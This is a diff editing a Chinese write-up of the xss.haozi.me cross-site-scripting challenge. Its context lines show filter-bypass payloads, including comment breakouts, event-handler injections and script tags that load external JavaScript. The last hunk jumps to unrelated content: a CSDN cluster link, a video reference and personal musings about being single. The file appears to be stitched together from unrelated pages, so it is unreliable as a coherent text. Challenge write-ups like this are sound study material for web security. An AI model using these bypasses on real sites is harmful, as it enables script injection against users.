@@ -59,9 +59,9 @@ input code&lt;script>window.onerror=eval;throw'=alert\x281\x29'&lt;/script
 
 过滤了圆括号和反引号。
 
-““标签中可以直接执行HTML实体字符。
+&lt;svg&gt; 标签中可以直接执行 HTML 实体字符。
 
-或者”“标签的srcdoc里面的内容可以直接在HTML中显示出来。
+或者 &lt;iframe&gt; 标签的 srcdoc 里面的内容可以直接在 HTML 中显示出来。
 
 
 
@@ -74,7 +74,7 @@ input code--!>&lt;script>alert(1)&lt;/script>
 
 解释
 将–&gt;替换成表情，并且输入的内容在注释中输出。
-HTML两种注释方法：  &lt;!–注释–!&gt;  这里我们可以用对称感叹号的方法注释。
+HTML 有两种注释方法：&lt;!--注释--&gt; 和 &lt;!--注释--!&gt;，这里可以用对称感叹号的方法注释。
 
 运行结果0x06server codefunction render (input) &amp;#123;
   input = input.replace(/auto|on.*=|&gt;/ig, &#39;_&#39;)
@@ -97,7 +97,7 @@ input codetype=image src onerror
 input code1&lt;body onload=&quot;alert(1)&quot;
 
 解释1
-将以&lt;开头 &gt;结尾，并且忽略大小写的字符替换成空。
+将以 &lt; 开头、&gt; 结尾并且忽略大小写的字符替换成空。
 可以利用浏览器的容错，去掉&gt;。
 
 运行截图1input code2&lt;svg/onload=alert(1)
@@ -114,7 +114,7 @@ input code1&lt;body onload=&quot;alert(1)&quot;
 input code&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;
 
 解释
-将替换成\u574F\u4EBA，利用换行绕过。
+将 &lt;/style&gt; 替换成 \u574F\u4EBA，利用换行绕过。
 
 运行结果0x09server codefunction render (input) &amp;#123;
   let domainRe = /^https?:\/\/www\.segmentfault\.com/
@@ -149,7 +149,7 @@ input codehttps://www.segmentfault.com/&quot; onload=alert(1)&gt;
 input codehttps://www.segmentfault.com.wmcoder.site/j.js
 
 解释
-对很多符号进行了转义，例如&amp; ‘ “ &lt; &gt; &#x2F;  都转义成了html实体编码，html实体编码在html标签的属性中可以直接进行解析。并且匹配了以https://www.segmentfault.com开头的url。当我们访问 https://www.baidu.com@www.sina.com 的时候我们实际访问的是 https://www.sina,com。 所以这里我们可以用指定的url开头，但是用@符号来执行自己的js，在这个js中有弹窗的代码。
+对很多符号进行了转义，例如 &amp;、&#39;、&quot;、&lt;、&gt;、/ 都转义成了 HTML 实体编码，HTML 实体编码在 HTML 标签的属性中可以直接进行解析。并且匹配了以 https://www.segmentfault.com 开头的 URL。当我们访问 https://www.baidu.com@www.sina.com 的时候，实际访问的是 https://www.sina,com。所以这里可以用指定的 URL 开头，再用 @ 符号执行自己的 JavaScript，其中包含弹窗代码。
 
 运行结果0x0Bserver codefunction render (input) &amp;#123;
   input = input.toUpperCase()
@@ -188,7 +188,7 @@ alert(1)
 -->
 
 解释
-将符号 &lt; &#x2F; “ ‘ 替换成空，并且输入的内容是注释，这里可以用换行绕过。并且用html的注释符 –&gt; 注释掉后面的单引号和圆括号。
+将符号 &lt;、/、&quot;、&#39; 替换成空，并且输入的内容是注释，这里可以用换行绕过。再用 HTML 注释符 --&gt; 注释掉后面的单引号和圆括号。
 
 运行结果0x0Eserver codefunction render (input) &#123;
   input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1')
@@ -217,7 +217,7 @@ input code&lt;ſcript src="https://xss.haozi.me/j.js">&lt;/script>
 input code');alert('1
 
 解释
-对字符 &amp; ‘ “ &lt; &gt; &#x2F; 进行html编码，输入的内容在img标签中，所以编码没有影响。内容在console.error中，我们可以闭合console.error，并且在onerror属性中添加一个alert。
+对字符 &amp;、&#39;、&quot;、&lt;、&gt;、/ 进行 HTML 编码。输入内容在 img 标签中，所以编码没有影响。内容在 console.error 中，可以闭合 console.error，并在 onerror 属性中添加一个 alert。
 
 运行结果0x10server codefunction render (input) &#123;
   return `
@@ -1173,8 +1173,7 @@ CSDN:HTCondor下多台Linux计算集群的搭建_未名编程-CSDN博客
 
 
 
- 
-
+在哔哩哔哩观看相关视频（BV11A411T7NC）
 原因好多啊 一时我居然还列不完
 不是很懂得辨别对异性的感觉是心动、好感、喜欢还是爱，所以不想含含糊糊脱单
 单身太久了，以至于让我习惯了什么事情都自己来，不喜欢依靠和麻烦别人，也不喜欢突然有个人打乱了我的生活节奏
